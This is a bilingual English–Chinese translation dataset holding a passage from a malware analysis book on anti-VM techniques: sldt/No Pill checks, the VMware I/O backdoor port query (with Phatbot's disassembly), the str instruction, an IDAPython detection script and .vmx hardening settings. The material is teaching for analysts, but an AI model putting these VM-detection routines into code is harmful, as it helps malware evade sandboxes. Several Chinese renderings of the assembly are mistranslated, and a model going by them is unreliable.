  zh: VMware检测的sgdt和sldt指令技术通常被称为No Pill。与Red Pill不同，No Pill依赖于LDT（局部描述符表）结构被分配给处理器，而不是操作系统。由于Windows通常不使用LDT结构，但VMware提供了对它的虚拟支持，因此表将可预测地不同：宿主机器上的LDT位置将为零，而在虚拟机上，它将不为零。通过将sldt指令的结果与零进行比较，可以简单地完成这项任务。
- en: 'structure is assigned to a processor, not an operating system. And because
    Windows does not normally use the LDT structure, but VMware provides virtual support
    for it, the table will differ predictably: The LDT location on the host machine
    will be zero, and on the virtual machine, it will be nonzero. A simple check for
    zero against the result of the sldt instruction does the trick.'
  id: totrans-1297
  prefs: []
  type: TYPE_NORMAL
  zh: 结构被分配给处理器，而不是操作系统。由于Windows通常不使用LDT结构，但VMware提供了对它的虚拟支持，因此表将可预测地不同：宿主机器上的LDT位置将为零，而在虚拟机上，它将不为零。通过将sldt指令的结果与零进行比较，可以简单地完成这项任务。
- en: The sldt method can be subverted in VMware by disabling acceleration.
  id: totrans-1298
  prefs: []
  type: TYPE_NORMAL
  zh: 在VMware中，可以通过禁用加速来绕过sldt方法。
- en: To do this, select **VM****Settings****Processors** and check the **Disable
    Acceleration** box. No Pill solves this acceleration issue by using the smsw instruction
    if the sldt method fails. This method involves inspecting the undocumented high-order
    bits returned by the smsw instruction.
  id: totrans-1299
  prefs: []
  type: TYPE_NORMAL
  zh: 要做到这一点，请选择**VM****设置****处理器**并检查**禁用加速**框。如果sldt方法失败，No Pill通过使用smsw指令来解决这个加速问题。这种方法涉及检查smsw指令返回的未记录的高位。
- en: '***Querying the I/O Communication Port***'
  id: totrans-1300
  prefs: []
  type: TYPE_NORMAL
  zh: '***查询I/O通信端口***'
- en: Perhaps the most popular anti-VMware technique currently in use is that of querying
    the I/O communication port. This technique is frequently encountered in worms
    and bots, such as the Storm worm and Phatbot.
  id: totrans-1301
  prefs: []
  type: TYPE_NORMAL
  zh: 目前最流行的反VMware技术之一是查询I/O通信端口。这种技术在蠕虫和僵尸程序中很常见，如Storm蠕虫和Phatbot。
- en: VMware uses virtual I/O ports for communication between the virtual machine
    and the host operating system to support functionality like copy and paste between
    the two systems. The port can be queried and compared with a magic number to identify
    the use of VMware.
  id: totrans-1302
  prefs: []
  type: TYPE_NORMAL
  zh: VMware使用虚拟I/O端口在虚拟机与宿主操作系统之间进行通信，以支持两个系统之间的复制和粘贴等功能。可以通过查询端口并与一个魔数进行比较来识别VMware的使用。
- en: Anti-Virtual Machine Techniques
  id: totrans-1303
  prefs: []
  type: TYPE_NORMAL
  zh: 反虚拟机技术
- en: '**375**'
  id: totrans-1304
  prefs: []
  type: TYPE_NORMAL
  zh: '**375**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1305
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The success of this technique depends on the x86 in instruction, which copies
    data from the I/O port specified by the source operand to a memory location specified
    by the destination operand. VMware monitors the use of the in instruction and
    captures the I/O destined for the communication channel port 0x5668 (VX). Therefore,
    the second operand needs to be loaded with VX in order to check for VMware, which
    happens only when the EAX
  id: totrans-1306
  prefs: []
  type: TYPE_NORMAL
  zh: 这种技术的成功取决于x86的`in`指令，它从源操作数指定的I/O端口复制数据到由目标操作数指定的内存位置。VMware监视`in`指令的使用并捕获指向通信通道端口0x5668（VX）的I/O。因此，第二个操作数需要加载VX以检查VMware，这仅在EAX
- en: register is loaded with the magic number 0x564D5868 (VMXh). ECX must be loaded
    with a value corresponding to the action you wish to perform on the port. The
    value 0xA means “get VMware version type,” and 0x14 means “get the memory size.”
    Both can be used to detect VMware, but 0xA is more popular because it may determine
    the VMware version.
  id: totrans-1307
  prefs: []
  type: TYPE_NORMAL
  zh: 注册器被加载为魔数0x564D5868（VMXh）。`ECX`必须加载与您要在端口上执行的操作相对应的值。值0xA表示“获取VMware版本类型”，而0x14表示“获取内存大小”。两者都可以用于检测VMware，但0xA更受欢迎，因为它可能确定VMware版本。
- en: Phatbot, also known as Agobot, is a botnet that is simple to use. One of its
    features is its built-in support of the I/O communication port technique, as shown
    in Listing 17-3\.
  id: totrans-1308
  prefs: []
  type: TYPE_NORMAL
  zh: Phatbot，也称为Agobot，是一个易于使用的僵尸网络。其一个特性是内置了对I/O通信端口技术的支持，如列表17-3所示。
- en: 004014FA push eax
  id: totrans-1309
  prefs: []
  type: TYPE_NORMAL
  zh: 004014FA 将`eax`压入栈中
- en: 004014FB push ebx
  id: totrans-1310
  prefs: []
  type: TYPE_NORMAL
  zh: 004014FB 将`ebx`压入栈中
- en: 004014FC push ecx
  id: totrans-1311
  prefs: []
  type: TYPE_NORMAL
  zh: 004014FC 将`ecx`压入栈中
- en: 004014FD push edx
  id: totrans-1312
  prefs: []
  type: TYPE_NORMAL
  zh: 004014FD 将`edx`压入栈中
- en: 004014FE mov eax, 'VMXh' 
  id: totrans-1313
  prefs: []
  type: TYPE_NORMAL
  zh: 004014FE 将'VMXh'压入栈中
- en: 00401503 mov ebx, [ebp+var_1C]
  id: totrans-1314
  prefs: []
  type: TYPE_NORMAL
  zh: 00401503 将`ebp+var_1C`处的值移动到`ebx`
- en: 00401506 mov ecx, 0xA
  id: totrans-1315
  prefs: []
  type: TYPE_NORMAL
  zh: 00401506 将`ecx`设置为0xA
- en: 00401509 mov dx, 'VX' 
  id: totrans-1316
  prefs: []
  type: TYPE_NORMAL
  zh: 00401509 将`dx`设置为'VX' 
- en: 0040150E in eax, dx
  id: totrans-1317
  prefs: []
  type: TYPE_NORMAL
  zh: 0040150E 从`dx`读取到`eax`
- en: 0040150F mov [ebp+var_24], eax
  id: totrans-1318
  prefs: []
  type: TYPE_NORMAL
  zh: 0040150F 将`ebp+var_24`处的值移动到`eax`
- en: 00401512 mov [ebp+var_1C], ebx
  id: totrans-1319
  prefs: []
  type: TYPE_NORMAL
  zh: 00401512 将`ebp+var_1C`处的值移动到`ebx`
- en: 00401515 mov [ebp+var_20], ecx
  id: totrans-1320
  prefs: []
  type: TYPE_NORMAL
  zh: 00401515 将`ebp+var_20`处的值移动到`ecx`
- en: 00401518 mov [ebp+var_28], edx
  id: totrans-1321
  prefs: []
  type: TYPE_NORMAL
  zh: 00401518 将`ebp+var_28`处的值移动到`edx`
- en: '...'
  id: totrans-1322
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040153E mov eax, [ebp+var_1C]
  id: totrans-1323
  prefs: []
  type: TYPE_NORMAL
  zh: 0040153E 将`ebp+var_1C`处的值移动到`eax`
- en: 00401541 cmp eax, 'VMXh' 
  id: totrans-1324
  prefs: []
  type: TYPE_NORMAL
  zh: 00401541 比较`eax`与'VMXh' 
- en: 00401546 jnz short loc_40155C
  id: totrans-1325
  prefs: []
  type: TYPE_NORMAL
  zh: 00401546 如果不跳转，则跳转到`loc_40155C`
- en: '*Listing 17-3: Phatbot’s VMware detection*'
  id: totrans-1326
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表17-3：Phatbot的VMware检测*'
- en: The malware first loads the magic number 0x564D5868 (VMXh) into the EAX
  id: totrans-1327
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件首先将魔数0x564D5868（VMXh）加载到EAX
- en: register at . Next, it loads the local variable var_1c into EBX, a memory address
    that will return any reply from VMware. ECX is loaded with the value 0xA to get
    the VMware version type. At , 0x5668 (VX) is loaded into DX, to be used in the
    following in instruction to specify the VMware I/O communication port.
  id: totrans-1328
  prefs: []
  type: TYPE_NORMAL
  zh: 在处，它将局部变量`var_1c`加载到`EBX`中，这是一个将返回VMware任何回复的内存地址。`ECX`被加载为0xA以获取VMware版本类型。在处，0x5668（VX）被加载到`DX`中，用于以下指令中指定VMware
    I/O通信端口。
- en: Upon execution, the in instruction is trapped by the virtual machine and emulated
    to execute it. The in instruction uses parameters of EAX (magic value), ECX (operation),
    and EBX (return information). If the magic value matches VMXh and the code is
    running in a virtual machine, the virtual machine monitor will echo that back
    in the memory location specified by the EBX
  id: totrans-1329
  prefs: []
  type: TYPE_NORMAL
  zh: 在执行时，`in`指令被虚拟机捕获并模拟执行。`in`指令使用EAX（魔值）、ECX（操作）和EBX（返回信息）的参数。如果魔值匹配VMXh且代码在虚拟机中运行，虚拟机监控器将在EBX指定的内存位置回显。
- en: register.
  id: totrans-1330
  prefs: []
  type: TYPE_NORMAL
  zh: 注册器。
- en: The check at  determines whether the code is being run in a virtual machine.
    Since the get version type option is selected, the ECX register will contain the
    type of VMware (1=Express, 2=ESX, 3=GSX, and 4=Workstation).
  id: totrans-1331
  prefs: []
  type: TYPE_NORMAL
  zh: 在处的检查确定代码是否在虚拟机中运行。由于选择了获取版本类型选项，ECX寄存器将包含VMware的类型（1=Express，2=ESX，3=GSX，4=Workstation）。
- en: '**376**'
  id: totrans-1332
  prefs: []
  type: TYPE_NORMAL
  zh: '**376**'
- en: Chapter 17
  id: totrans-1333
  prefs: []
  type: TYPE_NORMAL
  zh: 第17章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1334
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The easiest way to overcome this technique is to NOP-out the in instruction
    or to patch the conditional jump to allow it regardless of the outcome of the
    comparison.
  id: totrans-1335
  prefs: []
  type: TYPE_NORMAL
  zh: 克服此技术的最简单方法是清除in指令或修补条件跳转以允许它无论比较结果如何。
- en: '***Using the str Instruction***'
  id: totrans-1336
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用str指令***'
- en: The str instruction retrieves the segment selector from the task register, which
    points to the task state segment (TSS) of the currently executing task.
  id: totrans-1337
  prefs: []
  type: TYPE_NORMAL
  zh: str指令从任务寄存器中检索段选择器，该选择器指向当前执行任务的任务状态段（TSS）。
- en: Malware authors can use the str instruction to detect the presence of a virtual
    machine, since the values returned by the instruction may differ on the virtual
    machine versus a native system. (This technique does not work on multiprocessor
    hardware.)
  id: totrans-1338
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件作者可以使用str指令来检测虚拟机的存在，因为该指令在虚拟机和原生系统上返回的值可能不同。（此技术在多处理器硬件上不起作用。）
- en: 'Figure 17-2 shows the str instruction at 0x401224 in malware known as *SNG.exe*.
    This loads the TSS into the 4 bytes: var_1 through var_4, as labeled by IDA Pro.
    Two comparisons are made at 0x40125A and 0x401262 to determine if VMware is detected.'
  id: totrans-1339
  prefs: []
  type: TYPE_NORMAL
  zh: 图17-2显示了恶意软件*SNG.exe*中0x401224处的str指令。此指令将TSS加载到4个字节：var_1通过var_4，如IDA Pro所示。在0x40125A和0x401262处进行两次比较，以确定是否检测到VMware。
- en: '***Anti-VM x86 Instructions***'
  id: totrans-1340
  prefs: []
  type: TYPE_NORMAL
  zh: '***Anti-VM x86 Instructions***'
- en: 'We’ve just reviewed the most common instructions used by malware to employ
    anti-VM techniques. These instructions are as follows:'
  id: totrans-1341
  prefs: []
  type: TYPE_NORMAL
  zh: 我们刚刚回顾了恶意软件使用最常见的反虚拟机技术指令。这些指令如下：
- en: 
  id: totrans-1342
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: sidt
  id: totrans-1343
  prefs: []
  type: TYPE_NORMAL
  zh: sidt
- en: 
  id: totrans-1344
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: sgdt
  id: totrans-1345
  prefs: []
  type: TYPE_NORMAL
  zh: sgdt
- en: 
  id: totrans-1346
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: sldt
  id: totrans-1347
  prefs: []
  type: TYPE_NORMAL
  zh: sldt
- en: 
  id: totrans-1348
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: smsw
  id: totrans-1349
  prefs: []
  type: TYPE_NORMAL
  zh: smsw
- en: 
  id: totrans-1350
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: str
  id: totrans-1351
  prefs: []
  type: TYPE_NORMAL
  zh: str
- en: 
  id: totrans-1352
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: in (with the second operand set to VX)
  id: totrans-1353
  prefs: []
  type: TYPE_NORMAL
  zh: in (第二个操作数设置为VX)
- en: 
  id: totrans-1354
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: cpuid
  id: totrans-1355
  prefs: []
  type: TYPE_NORMAL
  zh: cpuid
- en: Malware will not typically run these instructions unless it is performing VMware
    detection, and avoiding this detection can be as easy as patching the binary to
    avoid calling these instructions. These instructions are basically useless if
    executed in user mode, so if you see them, they’re likely part of anti-VMware
    code. VMware describes roughly 20 instructions as “not virtualizable,” of which
    the preceding are the most commonly used by malware.
  id: totrans-1356
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件通常不会运行这些指令，除非它正在执行VMware检测，避免这种检测可以通过修补二进制文件以避免调用这些指令来实现。如果执行在用户模式下，这些指令基本上是无用的，所以如果您看到它们，它们很可能是反VMware代码的一部分。VMware描述了大约20条指令为“不可虚拟化”，其中前面的是恶意软件最常用的。
- en: '***Highlighting Anti-VM in IDA Pro***'
  id: totrans-1357
  prefs: []
  type: TYPE_NORMAL
  zh: '***在IDA Pro中突出显示Anti-VM***'
- en: You can search for the instructions listed in the previous section in IDA Pro
    using the IDAPython script shown in Listing 17-4\. This script looks for the instructions,
    highlights any in red, and prints the total number of anti-VM
  id: totrans-1358
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以使用Listing 17-4中显示的IDA Pro脚本在IDA Pro中搜索上一节中列出的指令。此脚本查找指令，将任何找到的指令用红色突出显示，并打印出anti-VM指令的总数。
- en: instructions found in IDA’s output window.
  id: totrans-1359
  prefs: []
  type: TYPE_NORMAL
  zh: 指令在IDA输出窗口中找到。
- en: Figure 17-2 shows a partial result of running this script against *SNG.exe*
    with one location (str at 0x401224) highlighted by the bar. Examining the highlighted
    code in IDA Pro will allow you to quickly see if the instruction found is involved
    in an anti-VM technique. Further investigation shows that the str instruction
    is being used to detect VMware.
  id: totrans-1360
  prefs: []
  type: TYPE_NORMAL
  zh: 图17-2显示了运行此脚本对*SNG.exe*的局部结果，其中一条指令（str指令在0x401224处）被条形图突出显示。在IDA Pro中检查突出显示的代码将允许您快速查看找到的指令是否涉及反虚拟机技术。进一步调查表明，str指令正在被用来检测VMware。
- en: Anti-Virtual Machine Techniques
  id: totrans-1361
  prefs: []
  type: TYPE_NORMAL
  zh: 反虚拟机技术
- en: '**377**'
  id: totrans-1362
  prefs: []
  type: TYPE_NORMAL
  zh: '**377**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1363
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 88](index-411_1.png)'
  id: totrans-1364
  prefs: []
  type: TYPE_IMG
  zh: '![Image 88](index-411_1.png)'
- en: '*Figure 17-2: The str anti-VM technique in* SNG.exe from idautils import *'
  id: totrans-1365
  prefs: []
  type: TYPE_NORMAL
  zh: '*图17-2：SNG.exe中的str反虚拟机技术* from idautils import *'
- en: from idc import *
  id: totrans-1366
  prefs: []
  type: TYPE_NORMAL
  zh: from idc import *
- en: heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))
  id: totrans-1367
  prefs: []
  type: TYPE_NORMAL
  zh: heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))
- en: antiVM = []
  id: totrans-1368
  prefs: []
  type: TYPE_NORMAL
  zh: antiVM = []
- en: 'for i in heads:'
  id: totrans-1369
  prefs: []
  type: TYPE_NORMAL
  zh: 'for i in heads:'
- en: 'if (GetMnem(i) == "sidt" or GetMnem(i) == "sgdt" or GetMnem(i) == "sldt" or
    GetMnem(i) == "smsw" or GetMnem(i) == "str" or GetMnem(i) == "in" or GetMnem(i)
    == "cpuid"):'
  id: totrans-1370
  prefs: []
  type: TYPE_NORMAL
  zh: 'if (GetMnem(i) == "sidt" or GetMnem(i) == "sgdt" or GetMnem(i) == "sldt" or
    GetMnem(i) == "smsw" or GetMnem(i) == "str" or GetMnem(i) == "in" or GetMnem(i)
    == "cpuid"):'
- en: antiVM.append(i)
  id: totrans-1371
  prefs: []
  type: TYPE_NORMAL
  zh: antiVM.append(i)
- en: 'print "Number of potential Anti-VM instructions: %d" % (len(antiVM)) for i
    in antiVM:'
  id: totrans-1372
  prefs: []
  type: TYPE_NORMAL
  zh: 'print "Number of potential Anti-VM instructions: %d" % (len(antiVM)) for i
    in antiVM:'
- en: SetColor(i, CIC_ITEM, 0x0000ff)
  id: totrans-1373
  prefs: []
  type: TYPE_NORMAL
  zh: SetColor(i, CIC_ITEM, 0x0000ff)
- en: 'Message("Anti-VM: %08x\n" % i)'
  id: totrans-1374
  prefs: []
  type: TYPE_NORMAL
  zh: 'Message("Anti-VM: %08x\n" % i)'
- en: '*Listing 17-4: IDA Pro script to find anti-VM instructions* **378**'
  id: totrans-1375
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 17-4: IDA Pro脚本用于查找反虚拟机指令* **378**'
- en: Chapter 17
  id: totrans-1376
  prefs: []
  type: TYPE_NORMAL
  zh: 第17章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1377
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Using ScoopyNG***'
  id: totrans-1378
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用ScoopyNG***'
- en: 'ScoopyNG ( *http://www.trapkit.de/*) is a free VMware detection tool that implements
    seven different checks for a virtual machine, as follows:'
  id: totrans-1379
  prefs: []
  type: TYPE_NORMAL
  zh: ScoopyNG (*http://www.trapkit.de/*) 是一款免费的VMware检测工具，它实现了针对虚拟机的七种不同检查，如下所示：
- en: 
  id: totrans-1380
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The first three checks look for the sidt, sgdt, and sldt (Red Pill and No Pill)
    instructions.
  id: totrans-1381
  prefs: []
  type: TYPE_NORMAL
  zh: 前三次检查寻找sidt、sgdt和sldt（红帽和无帽）指令。
- en: 
  id: totrans-1382
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The fourth check looks for str.
  id: totrans-1383
  prefs: []
  type: TYPE_NORMAL
  zh: 第四次检查寻找str.
- en: 
  id: totrans-1384
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The fifth and sixth use the backdoor I/O port 0xa and 0x14 options, respectively.
  id: totrans-1385
  prefs: []
  type: TYPE_NORMAL
  zh: 第五和第六次分别使用后门I/O端口0xa和0x14选项。
- en: 
  id: totrans-1386
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The seventh check relies on a bug in older VMware versions running in emulation
    mode.
  id: totrans-1387
  prefs: []
  type: TYPE_NORMAL
  zh: 第七次检查依赖于在仿真模式下运行的较旧VMware版本中的漏洞。
- en: For a disassembled version of ScoopyNG’s fourth check, see Figure 17-2\.
  id: totrans-1388
  prefs: []
  type: TYPE_NORMAL
  zh: 要查看ScoopyNG第四次检查的反汇编版本，请参阅图17-2。
- en: '**Tweaking Settings**'
  id: totrans-1389
  prefs: []
  type: TYPE_NORMAL
  zh: '**调整设置**'
- en: We have discussed a number of ways to thwart VMware detection throughout this
    chapter, including patching code, removing VMware Tools, changing VMware settings,
    and using a multiprocessor machine.
  id: totrans-1390
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们讨论了多种阻止VMware检测的方法，包括修补代码、删除VMware工具、更改VMware设置和使用多处理器机器。
- en: There are also a number of undocumented features in VMware that can help mitigate
    anti-VMware techniques. For example, placing the options in Listing 17-5 into
    the virtual machine’s *.vmx* file will make the virtual machine less detectable.
  id: totrans-1391
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，VMware中还有一些未记录的功能可以帮助减轻反VMware技术。例如，将列表17-5中的选项放入虚拟机的*.vmx*文件中，将使虚拟机更难被检测到。
- en: isolation.tools.getPtrLocation.disable = "TRUE"
  id: totrans-1392
  prefs: []
  type: TYPE_NORMAL
  zh: isolation.tools.getPtrLocation.disable = "TRUE"
- en: isolation.tools.setPtrLocation.disable = "TRUE"
  id: totrans-1393
  prefs: []
  type: TYPE_NORMAL
  zh: isolation.tools.setPtrLocation.disable = "TRUE"
